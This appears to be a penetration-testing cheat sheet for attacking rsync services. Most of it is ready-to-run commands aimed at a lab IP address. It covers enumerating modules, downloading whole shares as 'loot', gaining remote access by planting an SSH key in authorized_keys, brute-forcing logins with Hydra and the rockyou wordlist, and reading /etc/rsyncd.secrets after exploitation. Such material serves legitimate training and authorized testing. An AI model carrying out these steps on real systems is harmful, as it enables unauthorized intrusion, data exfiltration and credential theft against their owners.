# Rsync
**Default Port:** 873 (TCP) 
**Key Insight:** Rsync is a fast file copying tool. Misconfigured modules often allow **anonymous read/write** access, leading to sensitive data leakage or RCE (via SSH keys or Cron jobs).
## 1. Discovery & Banner Grabbing
**Goal:** Identify if the service is active and the protocol version.
### Nmap
```shell
# Version Scan & Enumeration
# ⚠️ OPSEC: Moderate Noise.
sudo nmap -sV -p 873 --script rsync-list-modules 10.129.2.15
```
### Netcat (Manual Probe)
**Description:** Manually query the protocol handshake.
```shell
# Connect
nc -nv 10.129.2.15 873

# Handshake (Type this to list modules manually)
@RSYNCD: 31.0
#list
```
## 2. Enumerating Shares (Modules)
**Goal:** List available "modules" (shares) and check for anonymous access.
### Listing Modules
**Syntax:** `rsync -av --list-only rsync://<IP>`
```shell
# List all available modules
rsync -av --list-only rsync://10.129.2.15/

# List content of a SPECIFIC module (e.g., 'backups')
rsync -av --list-only rsync://10.129.2.15/backups/
```
## 3. Downloading & Uploading (Interaction)
**Goal:** Exfiltrate data or attempt to write malicious files (RCE).
### Downloading (Exfiltration)
**Syntax:** `rsync -av rsync://<IP>/<Module>/<File> <Local_Dest>`
```shell
# Download a single file
rsync -av rsync://10.129.2.15/backups/database.sql .

# Download entire module (Recursive)
rsync -av rsync://10.129.2.15/backups/ ./loot/
```
### Uploading (Write Access Test)
**Vulnerability:** If `read only = no` is set in the config, you can upload files.
```shell
# 1. Create a dummy file
touch test_upload.txt

# 2. Attempt Upload
# Syntax: rsync <Local_File> rsync://<IP>/<Module>/<Remote_File>
rsync -av test_upload.txt rsync://10.129.2.15/backups/test_upload.txt
```
### Exploitation: RCE via SSH Key
**Scenario:** You have write access to a home directory (e.g., `/home/user/`) or `/root/`. 
**Attack:** Upload your public SSH key to `authorized_keys`.
```shell
# 1. Generate Key (if needed)
ssh-keygen -f key_rsa

# 2. Upload Key to .ssh directory
rsync -av key_rsa.pub rsync://10.129.2.15/home_user/.ssh/authorized_keys

# 3. SSH Login
ssh -i key_rsa user@10.129.2.15
```
## 4. Brute Force (Hydra)
**Context:** If the module requires authentication (you get a password prompt).
```shell
# Brute force a specific user
hydra -l admin -P /usr/share/wordlists/rockyou.txt rsync://10.129.2.15
```
## 5. Post-Exploitation (Local)
**Context:** You have shell access.
```shell
# Configuration File
# Look for 'read only = no' or 'hosts allow'
cat /etc/rsyncd.conf

# Secrets File (If auth is used)
cat /etc/rsyncd.secrets
```